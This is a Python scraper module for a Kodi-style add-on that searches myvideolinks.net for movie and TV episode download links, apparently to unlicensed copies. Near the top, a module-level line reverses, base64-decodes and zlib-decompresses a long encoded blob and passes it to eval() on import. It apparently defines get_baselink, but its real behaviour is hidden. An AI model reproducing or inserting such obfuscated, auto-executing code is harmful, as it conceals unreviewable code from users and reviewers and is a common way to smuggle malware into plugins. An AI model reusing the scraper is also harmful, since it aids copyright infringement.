# -*- coding: utf-8 -*-

'''
    OathScrapers module
'''



import re, requests

from six import ensure_text
from six.moves import zip

from blackscrapers import parse_qs, urljoin, urlencode, quote_plus
from blackscrapers.modules import cleantitle, client, source_utils, cache, log_utils

from blackscrapers import custom_base_link
custom_base = custom_base_link(__name__)

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));eval((_)(b'=YGC/l8D//33n3vW3q5PRyr8NJrwgaPiKZTscHrOTaYc+mxReY5jAVqdV6Wkb0cpkPuip4fvgK+Qv8r4cCFLQZ/MVxBnWoOVbJ/qVxeKBdC9x2Zwa4P8k7AKGcK84LZtbrs0hcrTMRubvDQru3XaM6B50lg1XJ9WiN+b97TrOrfUhBm/8CA/AtQ5+syJzQP9nZE/MzdwDgUTA6Oh/nhF90FufANTbXHYmfbCXBeOQn1l95jA6tRe6JCjhyw88VHKPTGAhxbxZF/Mx5lqQrTO2T2yjYBmHq5GvquYKiteCbDcsMNldFCEDHuko9Ez5DwQ7zGwiQU+qf5rvknx24e1beuqZvHqEh3o0giIiOeX1Cz959o21dFwZ+gc6KHJ+S7E+QH/AQ9TyIwjuhvrPBWeHLHb/Frxi2opiIFDo3rrxES1GJC3QTOglE1jDiPt2unjO6T4CKOTvGFX04tiaxQSDyGTK8h0wExkxbRpdu6lYMTBrhRwxPYPZObWlVB2/u6cRVZFIXx9MGcAkK+yKtX9PkhDEiEjdkCpfZvgYgpnyjmj4cNOG41lWKPy3BInkZlyyEkInyV3YySYEfNyDDwhQ1aWAuGvv7LOZSjsaXSxpaneKaYLYTkoHLB06RjNeQT/iKP5YBiJkOlqSC31JqQh904+eUQmhMXd05OIMnY+MVhn0iNC/uQbhR4VCv5N6OaLyScZ7EYcn7uTR3t08jeDvR3GMv707JN6mGkhxRsnFVbKnFdzVn+jzblyP8wgyczw00eCP7jLJK5ZU6OndYg7anMHA0ugz0UXWmk3vOfS+YK40RGRibJDuAqSj2HYBS501rAcBV7hU2sLztz6DRgNnnpAwQrKMqMJufFALyjuhLMlZxGordIpwpYXTWeRAGDNQOdZ7gzBLD2hyjzY8CEqhQwxarya3/ZvYWnjlZ4nYwDqOESfr4gzdGRWfkBkTz1xsq9wHfR3Hm4lOmz3SG403ge4KAgKkE7XxyBrixM4sVI0dG6DL0iSDNnIagr7rlKrUBqOKkVW4olGltOnRPQFbkKN4u9gKMCH8AQ9mM6fHl7vcbTnkfDLtDt5gNP9XE1PsO87MM7R7aBlY1Y39WFYEt6UnvStYRZlXlZjuZ6Y0VXnghsy6+5V7ghUJjrCP4O+Pcc43XKw4j4KxPsBf3iLk1bBL9604DJt+C0jtHrzhv9s4zyJUzGHbO2bo09WzZp9ac4YEn/KD++4e3CWTX6bRxguZJ2bCCKKMXeThDzhaYj/JhIDhhQ/VwIbKlAQiA8XrOlLMn+uHg36dhouwLFXLE9LZQEGTIRebdCjIbG7/pSjCsl4KEAr691x+RChiUGhF9xn1h/46TPzTLGCmJGkTF1TnfyzXoNs4d22X28BMk7baV7muQbBWPOrRysvlufJH/zmzmFFyNd+McbF08CMjMWHTtEokXraqDIGtiIef07z2yP6t7jOvhrussKHFx5/YNzWV6bg71OuZUqXPSZToI5ja5BoVC1IjN+FsbSz7oajHajGsYfrM8fWHliQCUxUIcU0WKhgHfishhvU+DN1bOfYl5fkBYpm6HIfYsKx+E+kBTFVY1zSw11y2dyDfkTXbI4PISRkHnsIJvmwugfVfATJLtCRUFtgLUaUwC90+Xwcj9HfToc+GPjxcKkxPwHhEeXZBlN92BJcBp6xBdrRoCkMPxxcCpL/7tqMnuMW7Vz4ymvYivf7TOZnZ+IgzmV0tx1Pn1f6SacNxgS61QMYM7EpnlruJukep8s8RApxN2lB3VAAa47ilvvoIBvQldh+c3GbjHF+DQZoT7F4A9LCJHXfr3NBLzyAahPiWo5GTK+wueOKlEi6dfoPY3ei98RONjX1sdlc9SnjzwBsO9nSbn0w5OjQlxOiCRhvOWbpSN5YInreH0Vb2r5EitpBrHB7dTcTaWMV5gkrKrVaOdQhS7CsWX5L1oOI9F5MPBRYkKWlnpeZnhs/5FPa+k9pQo9MOvPGPkcatkLSjvZO/UEe8BaKQQIU27o8zmzqpFjqiT6kfIgOYQPqsmTQ3tgA4qtkdvEzTneIRqPv8SZUs2gJqaNNDxhYfXFCTNX2kRyNKz3HNG3cdEBczydm1Qujt+rbzDmEcA2T3ZGcnxRzu2kfEggjhuM/21X6qgEs1coMGXtHaTwgvXn+zzxEq7uQF2V4Ml99XUjodDtR+tZ6uwG96Wyk27ClxE9gotUTeCch44YMBZbGENlKcx0YvjB8QvjhvYPWNkb4eDtpl+ghRP5Df8u2I3bFGgN/mGPOj1RxKtBm5rifLiDsi48H8FhfwrO3nSFa17K5e+teDfX+wz9mPwQ7gIyeEAhL+zwY173t/eP//L/ff/O///TxUVvUzQqqVpy8qP+XzEzk2ZmZUoYmFe8/Te5QBoYxyWjlNwJe'))

class source:
    def __init__(self):
        self.priority = 1
        self.language = ['en']
        self.domains = ['dl.myvideolinks.net', 'myvideolinks.net', 'go.myvid.one']
        self.base_link = custom_base or cache.get(get_baselink, 24)
        self.search_link = '/?s=%s'
        self.aliases = []


    def movie(self, imdb, tmdb, title, localtitle, aliases, year):
        try:
            self.aliases.extend(aliases)
            url = {'imdb': imdb, 'title': title, 'year': year}
            url = urlencode(url)
            return url
        except Exception:
            return


    def tvshow(self, imdb, tvdb, tvshowtitle, localtvshowtitle, aliases, year):
        try:
            self.aliases.extend(aliases)
            url = {'imdb': imdb, 'tvdb': tvdb, 'tvshowtitle': tvshowtitle, 'year': year}
            url = urlencode(url)
            return url
        except Exception:
            return


    def episode(self, url, imdb, tvdb, title, premiered, season, episode):
        try:
            if url is None:
                return
            url = parse_qs(url)
            url = dict([(i, url[i][0]) if url[i] else (i, '') for i in url])
            url['title'], url['premiered'], url['season'], url['episode'] = title, premiered, season, episode
            url = urlencode(url)
            return url
        except Exception:
            return


    def sources(self, url, hostDict, hostprDict):
        sources = []
        try:

            if url is None:
                return sources

            data = parse_qs(url)
            data = dict([(i, data[i][0]) if data[i] else (i, '') for i in data])

            title = data['tvshowtitle'] if 'tvshowtitle' in data else data['title']

            hdlr = 'S%02dE%02d' % (int(data['season']), int(data['episode'])) if 'tvshowtitle' in data else data['year']

            query = '%s S%02dE%02d' % (
                title,
                int(data['season']),
                int(data['episode'])) if 'tvshowtitle' in data else '%s %s' % (
                title,
                data['year'])
            query = re.sub(r'(\\\|/| -|:|;|\*|\?|"|\'|<|>|\|)', ' ', query)
            query = self.search_link % quote_plus(query)

            # r = client.request(self.base_link)
            # search_base = client.parseDOM(r, 'form', ret='action')[0]
            # log_utils.log(search_base)

            #r, self.base_link = client.list_request(self.base_link or self.domains, query)
            #log_utils.log('MYVIDEOLINK r: ' + r)

            url = urljoin(self.base_link, query)
            r = client.request(url)
            results = client.parseDOM(r, 'article', attrs={'id': 'post-\d+'})
            if not 'tvshowtitle' in data: results = [i for i in results if data['imdb'] in i]
            p = client.parseDOM(results, 'h2')
            z = zip(client.parseDOM(p, 'a', ret='href'), client.parseDOM(p, 'a'))
            posts = [(i[1], i[0]) for i in z]

            check = hdlr if not 'tvshowtitle' in data else 'S%02d' % int(data['season'])
            check2 = hdlr if not 'tvshowtitle' in data else 'Season %s' % data['season']

            host_dict = hostprDict + hostDict

            items = []

            for post in posts:
                try:
                    if (not source_utils.is_match(post[0], title, check, self.aliases)) and (not source_utils.is_match(post[0], title, check2, self.aliases)):
                        continue
                    r = client.request(post[1])
                    r = ensure_text(r, errors='replace')
                    r = client.parseDOM(r, 'div', attrs={'class': 'entry-content.*?'})[0]

                    if 'tvshowtitle' in data:
                        z1 = zip(re.findall(r'<p><b>(.+?)</b>', r, re.S), re.findall(r'<ul>(.+?)</ul>', r, re.S))
                        z2 = zip(re.findall(r'<h2>(.+?)</h2>', r, re.I|re.S), re.findall(r'<ul>(.+?)</ul>', r, re.S))
                        for z in (z1, z2):
                            for f in z:
                                u = re.findall("'(http.+?)'", f[1]) + re.findall('"(http.+?)"', f[1])
                                u = [i for i in u if '/embed/' not in i]
                                t = f[0]
                                try: s = re.findall(r'((?:\d+\.\d+|\d+\,\d+|\d+|\d+\,\d+\.\d+)\s*(?:GB|GiB|MB|MiB))', t)[0]
                                except: s = '0'
                                items += [(t, i, s) for i in u]

                    else:
                        t = ensure_text(post[0], errors='replace')
                        u = re.findall("'(http.+?)'", r) + re.findall('"(http.+?)"', r)
                        u = [i for i in u if '/embed/' not in i]
                        try: s = re.findall(r'((?:\d+\.\d+|\d+\,\d+|\d+|\d+\,\d+\.\d+)\s*(?:GB|GiB|MB|MiB))', r)[0]
                        except: s = '0'
                        items += [(t, i, s) for i in u]

                except:
                    log_utils.log('MYVIDEOLINK ERROR', 1)
                    pass

            for item in items:
                try:
                    url = ensure_text(item[1])
                    url = client.replaceHTMLCodes(url)

                    void = ('.rar', '.zip', '.iso', '.part', '.png', '.jpg', '.bmp', '.gif', 'sub', 'srt')
                    if url.endswith(void):
                        continue

                    name = ensure_text(item[0], errors='replace')
                    name = cleantitle.get_title(name)
                    if not hdlr.lower() in name.lower():
                        continue

                    # t = re.sub(r'(\.|\(|\[|\s)(\d{4}|S\d*E\d*|S\d*|3D)(\.|\)|\]|\s|)(.+|)', '', name, re.I)
                    # if not cleantitle.get(t) == cleantitle.get(title):
                        # continue
                    # y = re.findall(r'[\.|\(|\[|\s](\d{4}|S\d*E\d*|S\d*)[\.|\)|\]|\s]', name)[-1].upper()
                    # if not y == hdlr:
                        # continue

                    valid, host = source_utils.is_host_valid(url, host_dict)
                    if not valid:
                        continue
                    host = client.replaceHTMLCodes(host)

                    quality, info = source_utils.get_release_quality(name, url)

                    try:
                        dsize, isize = source_utils._size(item[2])
                    except:
                        dsize, isize = 0.0, ''
                    info.insert(0, isize)

                    info = ' | '.join(info)

                    sources.append({'source': host, 'quality': quality, 'language': 'en', 'url': url, 'info': info,
                                    'direct': False, 'debridonly': False, 'size': dsize, 'name': name})
                except:
                    log_utils.log('MYVIDEOLINK ERROR', 1)
                    pass

            return sources
        except:
            log_utils.log('MYVIDEOLINK ERROR', 1)
            return sources


    def resolve(self, url):
        return url
